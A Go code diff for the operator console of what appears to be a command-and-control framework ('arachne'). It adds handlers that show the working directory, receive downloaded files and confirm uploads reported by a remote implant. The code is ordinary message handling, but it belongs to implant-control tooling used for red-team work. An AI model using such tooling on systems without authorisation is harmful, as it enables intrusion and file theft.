@@ -208,12 +208,14 @@ func (o *Operator) handleMessage(ctx context.Context, env *arachnepb.Envelope, s
 		o.handleLsResult(env)
 	case transport.MsgTypeExecute:
 		o.handleExecuteResult(env)
+	case transport.MsgTypePwd:
+		o.handlePwdResult(env)
+	case transport.MsgTypeDownload:
+		o.handleDownloadResult(env)
+	case transport.MsgTypeUpload:
+		o.handleUploadResult(env)
 	default:
-		if senderPub != nil {
-			log.Printf("[operator] received message type=%d", env.Type)
-		} else {
-			log.Printf("[operator] received message type=%d", env.Type)
-		}
+		log.Printf("[operator] received message type=%d", env.Type)
 	}
 }
 
@@ -382,6 +384,45 @@ func (o *Operator) handleExecuteResult(env *arachnepb.Envelope) {
 	if len(result.Stderr) > 0 {
 		fmt.Fprintf(os.Stderr, "%s\n", string(result.Stderr))
 	}
+}
+
+func (o *Operator) handlePwdResult(env *arachnepb.Envelope) {
+	result := &arachnepb.Pwd{}
+	if err := proto.Unmarshal(env.Data, result); err != nil {
+		log.Printf("[operator] unmarshal pwd result: %v", err)
+		return
+	}
+	fmt.Println(result.Path)
+}
+
+func (o *Operator) handleDownloadResult(env *arachnepb.Envelope) {
+	result := &arachnepb.Download{}
+	if err := proto.Unmarshal(env.Data, result); err != nil {
+		log.Printf("[operator] unmarshal download result: %v", err)
+		return
+	}
+	if !result.Exists {
+		fmt.Printf("download: file does not exist\n")
+		return
+	}
+	path := result.Path
+	if path == "" {
+		path = "downloaded"
+	}
+	if err := os.WriteFile(path, result.Data, 0644); err != nil {
+		fmt.Printf("download: write %s: %v\n", path, err)
+		return
+	}
+	fmt.Printf("downloaded %s (%d bytes)\n", path, len(result.Data))
+}
+
+func (o *Operator) handleUploadResult(env *arachnepb.Envelope) {
+	result := &arachnepb.Upload{}
+	if err := proto.Unmarshal(env.Data, result); err != nil {
+		log.Printf("[operator] unmarshal upload result: %v", err)
+		return
+	}
+	fmt.Printf("uploaded %d bytes to %s\n", result.BytesWritten, result.Path)
 }
 
 func (o *Operator) Cd(implantPeerID string, path string) error {
